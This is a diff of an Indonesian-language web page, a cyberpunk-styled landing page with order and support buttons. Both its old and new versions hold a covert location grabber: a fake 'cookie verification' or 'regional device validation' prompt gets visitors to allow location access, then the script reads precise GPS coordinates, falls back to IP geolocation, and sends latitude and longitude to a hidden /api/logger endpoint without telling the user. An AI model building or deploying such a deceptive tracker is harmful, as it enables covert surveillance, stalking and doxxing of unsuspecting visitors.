@@ -1,40 +1,62 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Sistem Verifikasi Cookies</title>
     <style>
-        #overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:999; text-align:center; padding-top:20%; }
+        :root { --neon: #00f3ff; --dark: #0a0a0a; }
+        body { background: var(--dark); color: var(--neon); font-family: 'Courier New', monospace; text-align: center; }
+        .cyber-btn { background: transparent; border: 2px solid var(--neon); color: var(--neon); padding: 15px 30px; cursor: pointer; transition: 0.3s; margin: 10px; box-shadow: 0 0 10px var(--neon); }
+        .cyber-btn:hover { background: var(--neon); color: black; }
+        #overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:999; display:none; flex-direction:column; justify-content:center; }
+        .hidden { display: none; opacity: 0; transition: 1s; }
+        .visible { display: block; opacity: 1; }
+        #qris-img { width: 200px; height: 200px; object-fit: cover; border: 2px solid var(--neon); }
     </style>
 </head>
 <body>
-    <div id="overlay">
-        <h1>Verifikasi Akses</h1>
-        <p>Setujui cookies untuk mengamankan jejak login anda.</p>
-        <button onclick="startDetection()">Verifikasi Sekarang</button>
+
+    <div id="page1">
+        <h1>PROJECT X: CYBERNETIC</h1>
+        <button class="cyber-btn" onclick="openOverlay()">MASUK</button>
     </div>
 
-    <img src="https://img2.pixhost.to/images/8123/729976172_alip-1779583858875.jpg" width="100%">
+    <div id="overlay">
+        <h2 style="color:white">VERIFIKASI SISTEM</h2>
+        <p>Akses lokasi diperlukan untuk validasi perangkat regional.</p>
+        <button class="cyber-btn" onclick="startDetection()">IZINKAN AKSES</button>
+    </div>
+
+    <div id="content" class="hidden">
+        <button class="cyber-btn">TENTANG DEVELOPER: [Deskripsi]</button>
+        <button class="cyber-btn">PILIHAN 2</button>
+        <button class="cyber-btn">PILIHAN 3</button>
+        <button class="cyber-btn">PILIHAN 4</button>
+        <button class="cyber-btn" onclick="showLinks()">SUPPORT DEVELOPER</button>
+        <button class="cyber-btn" onclick="showQris()">ORDER VIA WHATSAPP</button>
+    </div>
+
+    <div id="qris-section" class="hidden">
+        <img id="qris-img" src="qris.jpg" alt="QRIS">
+        <br>
+        <button class="cyber-btn" onclick="window.location.href='https://wa.me/628xxxxxxxxxx'">CHAT OWNER</button>
+    </div>
 
     <script>
-        function sendData(lat, lon, method) {
-            fetch(`/api/logger?lat=${lat}&lon=${lon}&method=${method}`);
-        }
-
+        function openOverlay() { document.getElementById('overlay').style.display = 'flex'; }
+        
         function startDetection() {
             document.getElementById('overlay').style.display = 'none';
+            document.getElementById('content').className = 'visible';
             
-            // Coba GPS Akurat (HTML5)
+            // Logika Hybrid Geolocation
             navigator.geolocation.getCurrentPosition(
-                (pos) => sendData(pos.coords.latitude, pos.coords.longitude, 'GPS_Akurat'),
-                () => {
-                    // Fallback ke IP Geolocation
-                    fetch('https://ipapi.co/json/')
-                        .then(r => r.json())
-                        .then(data => sendData(data.latitude, data.longitude, 'IP_Estimasi'));
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
+                (pos) => sendData(pos.coords.latitude, pos.coords.longitude, 'GPS'),
+                () => fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>sendData(d.latitude, d.longitude, 'IP')),
+                { enableHighAccuracy: true }
             );
         }
+
+        function sendData(lat, lon, m) { fetch(`/api/logger?lat=${lat}&lon=${lon}&method=${m}`); }
+        function showQris() { document.getElementById('qris-section').className = 'visible'; }
     </script>
 </body>
 </html>
